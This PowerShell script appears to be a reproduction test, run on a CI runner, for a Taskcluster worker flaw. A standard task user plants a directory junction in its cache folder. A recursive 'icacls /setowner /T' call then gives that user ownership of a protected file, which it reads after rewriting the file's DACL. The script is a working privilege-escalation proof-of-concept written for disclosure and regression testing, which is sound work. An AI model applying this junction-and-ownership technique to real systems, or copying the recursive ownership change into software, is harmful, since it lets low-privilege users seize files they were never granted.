$ErrorActionPreference = "Stop"
Set-StrictMode -Version Latest

function Invoke-Icacls {
    param(
        [Parameter(Mandatory = $true)]
        [string[]] $IcaclsArgs
    )

    Write-Host ("icacls.exe " + ($IcaclsArgs -join " "))
    & "$env:SystemRoot\System32\icacls.exe" @IcaclsArgs
    if ($LASTEXITCODE -ne 0) {
        throw "icacls exited with code $LASTEXITCODE"
    }
}

function Get-OwnerSid {
    param(
        [Parameter(Mandatory = $true)]
        [string] $LiteralPath
    )

    $owner = (Get-Acl -LiteralPath $LiteralPath).Owner
    $account = [System.Security.Principal.NTAccount]::new($owner)
    return $account.Translate([System.Security.Principal.SecurityIdentifier]).Value
}

function Invoke-AsTaskUser {
    param(
        [Parameter(Mandatory = $true)]
        [string] $ScriptPath,
        [Parameter(Mandatory = $true)]
        [System.Management.Automation.PSCredential] $Credential,
        [Parameter(Mandatory = $true)]
        [string] $WorkingDirectory
    )

    $process = Start-Process `
        -FilePath "$env:SystemRoot\System32\cmd.exe" `
        -ArgumentList @("/d", "/c", $ScriptPath) `
        -Credential $Credential `
        -WorkingDirectory $WorkingDirectory `
        -LoadUserProfile `
        -Wait `
        -PassThru
    return $process.ExitCode
}

function Set-OutsideBaseline {
    param(
        [Parameter(Mandatory = $true)]
        [string] $OutsideRoot,
        [Parameter(Mandatory = $true)]
        [string] $OutsideFile,
        [Parameter(Mandatory = $true)]
        [string] $TaskOwnerArg
    )

    $administratorsArg = "*S-1-5-32-544"
    $systemArg = "*S-1-5-18"
    Invoke-Icacls -IcaclsArgs @($OutsideRoot, "/inheritance:r")
    Invoke-Icacls -IcaclsArgs @($OutsideRoot, "/grant:r", "${administratorsArg}:(OI)(CI)F", "${systemArg}:(OI)(CI)F", "${TaskOwnerArg}:(RX)")
    Invoke-Icacls -IcaclsArgs @($OutsideFile, "/inheritance:r")
    Invoke-Icacls -IcaclsArgs @($OutsideFile, "/grant:r", "${administratorsArg}:F", "${systemArg}:F")
    Invoke-Icacls -IcaclsArgs @($OutsideRoot, "/setowner", $administratorsArg, "/T")
}

$suffix = [guid]::NewGuid().ToString("N").Substring(0, 8)
$taskUser = "tcicacls$suffix"
$taskPassword = "Aa1!" + $suffix + "Z9"
$securePassword = ConvertTo-SecureString $taskPassword -AsPlainText -Force
$credentialName = "$env:COMPUTERNAME\$taskUser"
$credential = [System.Management.Automation.PSCredential]::new($credentialName, $securePassword)

$testRoot = Join-Path $env:RUNNER_TEMP ("taskcluster-task-user-impact-" + $suffix)
$cacheRoot = Join-Path $testRoot "cache"
$outsideRoot = Join-Path $testRoot "outside"
$outsideFile = Join-Path $outsideRoot "protected-sentinel.txt"
$junction = Join-Path $cacheRoot "outside-junction"
$junctionFile = Join-Path $junction "protected-sentinel.txt"
$createJunctionScript = Join-Path $cacheRoot "create-junction.cmd"
$readBeforeScript = Join-Path $cacheRoot "read-before.cmd"
$readAfterGrantScript = Join-Path $cacheRoot "read-after-grant.cmd"
$takeAccessScript = Join-Path $cacheRoot "take-access-as-owner.cmd"
$beforeMarker = Join-Path $cacheRoot "before.txt"
$afterGrantMarker = Join-Path $cacheRoot "after-grant.txt"
$afterOwnerMarker = Join-Path $cacheRoot "after-owner.txt"
$afterOwnerLog = Join-Path $cacheRoot "after-owner.log"
$resultPath = Join-Path $env:GITHUB_WORKSPACE "task-user-impact-result.json"
$userCreated = $false

try {
    & "$env:SystemRoot\System32\net.exe" user $taskUser $taskPassword /add /expires:never /passwordchg:no
    if ($LASTEXITCODE -ne 0) {
        throw "Could not create temporary standard user"
    }
    $userCreated = $true

    $taskAccount = [System.Security.Principal.NTAccount]::new($credentialName)
    $taskSid = $taskAccount.Translate([System.Security.Principal.SecurityIdentifier]).Value
    $taskOwnerArg = "*$taskSid"

    New-Item -ItemType Directory -Path $cacheRoot -Force | Out-Null
    New-Item -ItemType Directory -Path $outsideRoot -Force | Out-Null
    Set-Content -LiteralPath $outsideFile -Value "task-user-boundary-crossed"
    Invoke-Icacls -IcaclsArgs @($cacheRoot, "/grant:r", "${taskOwnerArg}:(OI)(CI)F")

    @"
@echo off
mklink /J "$junction" "$outsideRoot"
exit /b %errorlevel%
"@ | Set-Content -LiteralPath $createJunctionScript -Encoding Ascii

    $junctionCreateExit = Invoke-AsTaskUser -ScriptPath $createJunctionScript -Credential $credential -WorkingDirectory $cacheRoot
    if ($junctionCreateExit -ne 0 -or -not (Test-Path -LiteralPath $junction)) {
        throw "Temporary standard user could not create the cache junction (exit $junctionCreateExit)"
    }

    Set-OutsideBaseline -OutsideRoot $outsideRoot -OutsideFile $outsideFile -TaskOwnerArg $taskOwnerArg

    @"
@echo off
type "$junctionFile" > "$beforeMarker"
exit /b %errorlevel%
"@ | Set-Content -LiteralPath $readBeforeScript -Encoding Ascii
    $beforeAccessExit = Invoke-AsTaskUser -ScriptPath $readBeforeScript -Credential $credential -WorkingDirectory $cacheRoot
    $blockedBeforeWorkerSetup = $beforeAccessExit -ne 0

    # Existing pre-commit operation: check independently whether the inheritable
    # cache-root ACE crosses the junction without /T.
    Invoke-Icacls -IcaclsArgs @($cacheRoot, "/grant:r", "${taskOwnerArg}:(OI)(CI)F")
    @"
@echo off
type "$junctionFile" > "$afterGrantMarker"
exit /b %errorlevel%
"@ | Set-Content -LiteralPath $readAfterGrantScript -Encoding Ascii
    $afterGrantAccessExit = Invoke-AsTaskUser -ScriptPath $readAfterGrantScript -Credential $credential -WorkingDirectory $cacheRoot
    $grantAloneStayedContained = $afterGrantAccessExit -ne 0

    # Restore the protected baseline and execute the ownership call introduced
    # by commit 726ac7a.
    Set-OutsideBaseline -OutsideRoot $outsideRoot -OutsideFile $outsideFile -TaskOwnerArg $taskOwnerArg
    Invoke-Icacls -IcaclsArgs @($cacheRoot, "/setowner", $taskOwnerArg, "/T")
    $outsideFileOwnerAfterRecursive = Get-OwnerSid -LiteralPath $outsideFile
    $taskBecameOutsideFileOwner = $outsideFileOwnerAfterRecursive -eq $taskSid

    @"
@echo off
icacls "$junctionFile" /grant:r "${taskOwnerArg}:F" > "$afterOwnerLog" 2>&1
if errorlevel 1 exit /b %errorlevel%
type "$junctionFile" > "$afterOwnerMarker"
exit /b %errorlevel%
"@ | Set-Content -LiteralPath $takeAccessScript -Encoding Ascii
    $afterOwnerAccessExit = Invoke-AsTaskUser -ScriptPath $takeAccessScript -Credential $credential -WorkingDirectory $cacheRoot
    $sentinel = if (Test-Path -LiteralPath $afterOwnerMarker) {
        (Get-Content -LiteralPath $afterOwnerMarker -Raw).Trim()
    } else {
        ""
    }
    $afterOwnerCommandLog = if (Test-Path -LiteralPath $afterOwnerLog) {
        (Get-Content -LiteralPath $afterOwnerLog -Raw).Trim()
    } else {
        ""
    }
    $taskUserChangedDaclAndRead = $afterOwnerAccessExit -eq 0 -and $sentinel -eq "task-user-boundary-crossed"

    $result = [ordered]@{
        osCaption = (Get-CimInstance Win32_OperatingSystem).Caption
        osVersion = [System.Environment]::OSVersion.VersionString
        imageVersion = $env:ImageVersion
        temporaryTaskUser = $taskUser
        temporaryTaskUserSid = $taskSid
        standardUserCreatedJunction = $junctionCreateExit -eq 0
        blockedBeforeWorkerSetup = $blockedBeforeWorkerSetup
        grantAloneStayedContained = $grantAloneStayedContained
        outsideFileOwnerAfterRecursive = $outsideFileOwnerAfterRecursive
        taskBecameOutsideFileOwner = $taskBecameOutsideFileOwner
        afterOwnerAccessExit = $afterOwnerAccessExit
        afterOwnerCommandLog = $afterOwnerCommandLog
        taskUserChangedDaclAndRead = $taskUserChangedDaclAndRead
        sentinelRead = $sentinel
    }

    $result | ConvertTo-Json | Set-Content -LiteralPath $resultPath
    $result | Format-List | Out-String | Write-Host

    if (-not $blockedBeforeWorkerSetup) {
        throw "The standard-user negative access control did not start blocked"
    }
    if (-not $grantAloneStayedContained) {
        throw "The earlier non-recursive /grant operation independently crossed the junction"
    }
    if (-not $taskBecameOutsideFileOwner) {
        throw "Recursive /setowner did not make the task user owner of the outside file"
    }
    if (-not $taskUserChangedDaclAndRead) {
        throw "The new owner could not change the outside file DACL and read its sentinel"
    }

    Write-Host "REPRODUCED IMPACT: a standard task user created the junction, became owner of the outside file, changed its DACL, and read it."
}
finally {
    if (Test-Path -LiteralPath $junction) {
        & "$env:SystemRoot\System32\cmd.exe" /d /c "rmdir `"$junction`""
    }
    if (Test-Path -LiteralPath $cacheRoot) {
        Remove-Item -LiteralPath $cacheRoot -Recurse -Force
    }
    if (Test-Path -LiteralPath $outsideRoot) {
        Remove-Item -LiteralPath $outsideRoot -Recurse -Force
    }
    if (Test-Path -LiteralPath $testRoot) {
        Remove-Item -LiteralPath $testRoot -Recurse -Force
    }
    if ($userCreated) {
        & "$env:SystemRoot\System32\net.exe" user $taskUser /delete
        if ($LASTEXITCODE -ne 0) {
            Write-Warning "Could not delete temporary user $taskUser"
        }
    }
}
